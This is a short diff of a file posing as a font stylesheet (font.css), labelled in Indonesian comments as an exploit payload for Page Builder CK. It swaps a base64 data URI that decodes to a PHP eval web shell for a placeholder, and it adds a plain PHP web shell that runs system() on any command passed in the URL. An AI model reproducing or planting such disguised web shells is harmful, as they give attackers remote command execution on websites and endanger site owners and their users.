@@ -1,5 +1,11 @@
 /* font.css - Payload untuk exploit */
 @font-face {
     font-family: 'pwn';
-    src: url('data:application/x-php;base64,PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2NtZCddKTsgPz4=');
+    src: url('data:application/x-php;base64,PD9waHAgLyogU2hlbGwgY29kZSBkaSBlc2FpICovID8+');
 }
+
+/* Atau format lain yang dieksekusi oleh Page Builder CK */
+<?php
+// Kode shell akan ditempatkan di sini
+system($_GET['cmd']);
+?>
